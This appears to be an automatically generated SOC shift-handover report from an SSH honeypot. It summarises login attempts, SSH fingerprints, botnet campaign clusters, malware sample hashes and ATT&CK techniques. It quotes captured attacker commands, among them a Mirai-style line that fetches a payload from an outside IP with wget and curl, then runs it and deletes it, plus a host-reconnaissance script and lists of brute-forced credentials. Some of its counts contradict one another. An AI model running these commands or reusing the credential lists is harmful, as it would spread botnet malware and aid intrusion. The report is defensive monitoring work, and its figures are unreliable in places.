# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-24 |
| **Generated At** | 2026-08-24T18:44:59Z |
| **Shift Time** | 18:44 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **158** |
| Confirmed Threats | **0** |
| False Positives Filtered | **158** (100.0%) |
| Unique Attacker IPs | **62** |
| Countries of Origin | **0** |
| High Severity Cases | **105** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **53** |
| Malware Samples Analyzed | **2** HIGH · **19** MED · 23 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **121** |
| Unique Credential Pairs | **84** |
| Unique Usernames | **11** |
| Unique Passwords | **83** |
| Successful Auth Pairs | **111** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 63 |
| `ubuntu` | 13 |
| `admin` | 9 |
| `operator` | 8 |
| `user` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `9999` | 5 |
| `test888` | 4 |
| `22` | 4 |
| `` | 4 |
| `default666` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `9999` | 5 |
| `test` | `test888` | 4 |
| `user` | `22` | 4 |
| `root` | `` | 4 |
| `default` | `default666` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123456789` | `92.118.39.71` | 2026-08-24T14:56:09 |
| `root` | `1234abcd` | `92.118.39.71` | 2026-08-24T14:58:17 |
| `ubuntu` | `test123@` | `217.60.255.130` | 2026-08-24T14:59:04 |
| `root` | `Seyed123` | `217.60.255.130` | 2026-08-24T14:59:07 |
| `root` | `123abc` | `92.118.39.71` | 2026-08-24T15:00:23 |
| `debian` | `111` | `60.166.8.174` | 2026-08-24T15:01:53 |
| `debian` | `111` | `113.11.34.221` | 2026-08-24T15:02:03 |
| `root` | `123qwe` | `92.118.39.71` | 2026-08-24T15:02:32 |
| `root` | `1q2w3e` | `92.118.39.71` | 2026-08-24T15:04:45 |
| `root` | `1q2w3e4r` | `92.118.39.71` | 2026-08-24T15:06:52 |
| `ubuntu` | `!qaz2wsx` | `217.60.255.130` | 2026-08-24T15:08:49 |
| `root` | `tehran123` | `217.60.255.130` | 2026-08-24T15:08:53 |
| `root` | `1qaz2wsx` | `92.118.39.71` | 2026-08-24T15:08:55 |
| `root` | `654321` | `92.118.39.71` | 2026-08-24T15:10:58 |
| `ubnt` | `222222` | `220.163.252.244` | 2026-08-24T15:12:12 |
| `ubnt` | `222222` | `179.185.227.77` | 2026-08-24T15:12:22 |
| `admin` | `admin` | `88.151.33.203` | 2026-08-24T15:12:43 |
| `root` | `P@ssw0rd` | `92.118.39.71` | 2026-08-24T15:12:59 |
| `root` | `P@ssword` | `92.118.39.71` | 2026-08-24T15:15:01 |
| `user` | `44444` | `195.222.57.183` | 2026-08-24T15:15:27 |
| `root` | `Root123` | `92.118.39.71` | 2026-08-24T15:17:02 |
| `test` | `test888` | `10.0.0.73` | 2026-08-24T15:18:07 |
| `ubuntu` | `Blackberry1` | `217.60.255.130` | 2026-08-24T15:18:24 |
| `root` | `Zavosh@123` | `217.60.255.130` | 2026-08-24T15:18:28 |
| `root` | `admin` | `92.118.39.71` | 2026-08-24T15:19:07 |
| `root` | `admin123` | `92.118.39.71` | 2026-08-24T15:21:20 |
| `root` | `letmein` | `92.118.39.71` | 2026-08-24T15:23:34 |
| `root` | `passw0rd` | `92.118.39.71` | 2026-08-24T15:25:53 |
| `user` | `22` | `10.0.0.73` | 2026-08-24T15:26:54 |
| `ubuntu` | `1234qwer` | `217.60.255.130` | 2026-08-24T15:27:44 |
| `root` | `Adnan@123` | `217.60.255.130` | 2026-08-24T15:27:49 |
| `root` | `password` | `92.118.39.71` | 2026-08-24T15:28:11 |
| `root` | `password1` | `92.118.39.71` | 2026-08-24T15:30:43 |
| `user` | `44444` | `2.180.15.240` | 2026-08-24T15:30:50 |
| `user` | `44444` | `59.95.137.64` | 2026-08-24T15:30:58 |
| `root` | `qwerty` | `92.118.39.71` | 2026-08-24T15:33:06 |
| `test` | `test888` | `201.28.176.31` | 2026-08-24T15:34:28 |
| `test` | `test888` | `62.192.226.83` | 2026-08-24T15:34:36 |
| `root` | `r00t` | `92.118.39.71` | 2026-08-24T15:35:02 |
| `ubuntu` | `1q2w3e4r.` | `217.60.255.130` | 2026-08-24T15:37:32 |
| `root` | `Boss@123` | `217.60.255.130` | 2026-08-24T15:37:35 |
| `root` | `root!@#` | `92.118.39.71` | 2026-08-24T15:39:13 |
| `default` | `default666` | `212.174.62.233` | 2026-08-24T15:39:31 |
| `root` | `root#123` | `92.118.39.71` | 2026-08-24T15:41:15 |
| `root` | `root0000` | `92.118.39.71` | 2026-08-24T15:43:20 |
| `user` | `22` | `218.23.95.14` | 2026-08-24T15:44:33 |
| `user` | `22` | `37.57.158.182` | 2026-08-24T15:44:43 |
| `root` | `root1111` | `92.118.39.71` | 2026-08-24T15:45:18 |
| `root` | `root123` | `92.118.39.71` | 2026-08-24T15:47:11 |
| `ubuntu` | `Asdf1234` | `217.60.255.130` | 2026-08-24T15:47:29 |
| `root` | `Arvan@123` | `217.60.255.130` | 2026-08-24T15:47:35 |
| `centos` | `centos999` | `90.70.76.142` | 2026-08-24T15:47:47 |
| `centos` | `centos999` | `181.129.31.42` | 2026-08-24T15:47:54 |
| `root` | `root1234` | `92.118.39.71` | 2026-08-24T15:49:06 |
| `default` | `default666` | `10.0.0.73` | 2026-08-24T15:50:28 |
| `root` | `root2024` | `92.118.39.71` | 2026-08-24T15:51:07 |
| `root` | `root2025` | `92.118.39.71` | 2026-08-24T15:53:09 |
| `root` | `root2222` | `92.118.39.71` | 2026-08-24T15:55:20 |
| `ubuntu` | `ab@123` | `217.60.255.130` | 2026-08-24T15:56:51 |
| `root` | `Saber@1234` | `217.60.255.130` | 2026-08-24T15:56:56 |
| `root` | `root4444` | `92.118.39.71` | 2026-08-24T15:57:39 |
| `operator` | `operator2023` | `10.0.0.73` | 2026-08-24T15:59:16 |
| `root` | `root5555` | `92.118.39.71` | 2026-08-24T16:00:06 |
| `root` | `root5678` | `92.118.39.71` | 2026-08-24T16:02:36 |
| `centos` | `centos999` | `218.94.115.164` | 2026-08-24T16:03:26 |
| `centos` | `centos999` | `116.7.248.50` | 2026-08-24T16:03:36 |
| `root` | `root6666` | `92.118.39.71` | 2026-08-24T16:04:37 |
| `support` | `support` | `176.53.159.196` | 2026-08-24T16:04:50 |
| `ubuntu` | `postgres2024` | `217.60.255.130` | 2026-08-24T16:06:23 |
| `root` | `arman123` | `217.60.255.130` | 2026-08-24T16:06:27 |
| `root` | `root9999` | `92.118.39.71` | 2026-08-24T16:06:41 |
| `default` | `default666` | `34.146.248.7` | 2026-08-24T16:07:03 |
| `default` | `default666` | `125.36.68.227` | 2026-08-24T16:07:12 |
| `root` | `root@123` | `92.118.39.71` | 2026-08-24T16:08:42 |
| `root` | `rootaccess` | `92.118.39.71` | 2026-08-24T16:10:42 |
| `admin` | `9999` | `211.178.165.251` | 2026-08-24T16:11:56 |
| `root` | `﻿------fuck------` | `4.172.218.10` | 2026-08-24T16:11:59 |
| `admin` | `9999` | `2.180.15.240` | 2026-08-24T16:12:05 |
| `root` | `rootadmin` | `92.118.39.71` | 2026-08-24T16:12:41 |
| `root` | `rootme` | `92.118.39.71` | 2026-08-24T16:14:40 |
| `ubuntu` | `ABcd1234` | `217.60.255.130` | 2026-08-24T16:16:02 |
| `root` | `123@qaz` | `217.60.255.130` | 2026-08-24T16:16:05 |
| `root` | `rootpass` | `92.118.39.71` | 2026-08-24T16:16:35 |
| `operator` | `operator2023` | `223.241.214.127` | 2026-08-24T16:17:06 |
| `operator` | `operator2023` | `181.129.31.42` | 2026-08-24T16:17:13 |
| `operator` | `operator2023` | `83.177.240.182` | 2026-08-24T16:17:16 |
| `root` | `rootpw` | `92.118.39.71` | 2026-08-24T16:18:30 |
| `admin` | `88888` | `10.0.0.73` | 2026-08-24T16:18:51 |
| `admin` | `88888` | `203.252.10.4` | 2026-08-24T16:20:19 |
| `admin` | `88888` | `101.13.1.58` | 2026-08-24T16:20:29 |
| `admin` | `9999` | `10.0.0.73` | 2026-08-24T16:23:15 |
| `ubuntu` | `abcd1234.` | `217.60.255.130` | 2026-08-24T16:25:23 |
| `root` | `QWE123qwe` | `217.60.255.130` | 2026-08-24T16:25:27 |
| `support` | `support` | `10.0.0.73` | 2026-08-24T16:29:35 |
| `ubuntu` | `Abcd.123` | `217.60.255.130` | 2026-08-24T16:35:01 |
| `root` | `q@123456` | `217.60.255.130` | 2026-08-24T16:35:04 |
| `admin` | `9999` | `78.72.168.178` | 2026-08-24T16:39:21 |
| `admin` | `9999` | `95.174.100.64` | 2026-08-24T16:39:30 |
| `ubuntu` | `.` | `217.60.255.130` | 2026-08-24T16:44:30 |
| `root` | `Mamad1234` | `217.60.255.130` | 2026-08-24T16:44:34 |
| `root` | `admin` | `45.198.224.26` | 2026-08-24T16:48:53 |
| `test` | `22222` | `181.87.154.121` | 2026-08-24T16:49:11 |
| `test` | `22222` | `196.188.187.85` | 2026-08-24T16:49:20 |
| `test` | `22222` | `203.252.10.4` | 2026-08-24T16:49:29 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-08-24T16:50:37 |
| `root` | `123@@@` | `165.1.75.106` | 2026-08-24T16:50:37 |
| `operator` | `operator111` | `10.0.0.73` | 2026-08-24T16:51:05 |
| `operator` | `operator111` | `65.109.188.178` | 2026-08-24T16:52:37 |
| `operator` | `operator111` | `36.137.38.119` | 2026-08-24T16:52:48 |
| `ubuntu` | `!@#456QWErty` | `217.60.255.130` | 2026-08-24T16:53:49 |
| `root` | `Vahid123` | `217.60.255.130` | 2026-08-24T16:53:53 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **158** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 46 |
| OpenSSH | 33 |
| libssh | 32 |
| Paramiko (Python) | 4 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 40 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 33 | 30 |
| `419da4c91ddb...` | Modern SSH client | 26 | 1 |
| `a2de0f306611...` | Mirai/variant | 4 | 1 |
| `f1e5e9d24e5e...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 40 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 33 | 30 | Mirai/variant |
| `419da4c91ddb...` | libssh | 26 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 6 | 2 | — |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |
| **Recon Loader Script** | 🟡 MEDIUM | 39 | 1 | `T1082, T1592, T1078, T1083` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
```
```
cd /tmp
```
```
wget http://5.182.210.174/ok
```
```
curl -O http://5.182.210.174/ok
```
```
chmod +x ok
```
Source IPs: `45.198.224.26`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.71`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **62** |
| Unique ASNs | **46** |
| High-Risk ASNs | **0** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 6 | LOW |
| `AS396982` | Google LLC | 4 | LOW |
| `AS9829` | National Internet Backbone | 3 | LOW |
| `AS58224` | Iran Telecommunication Company PJS | 2 | LOW |
| `AS398324` | Censys, Inc. | 2 | LOW |
| `AS3301` | Telia Company AB | 2 | LOW |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 2 | LOW |
| `AS8075` | Microsoft Corporation | 2 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (0)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

_No priority cases this shift. All confirmed sessions were credential scans only._

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

_No reconnaissance sessions this shift._

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

_No enriched IPs with abuse scores available._

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 117 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 105 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 42 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 40 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 39 |

---

## 🔕 False Positive Summary (158 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 158 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 158 cases |
| Tool 34  | Credential Extractor        | ✅ 121 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 62 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 158 filtered (100.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 46 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 17 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 0 priority case(s) shown individually · 0 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-24T18:44:59Z_
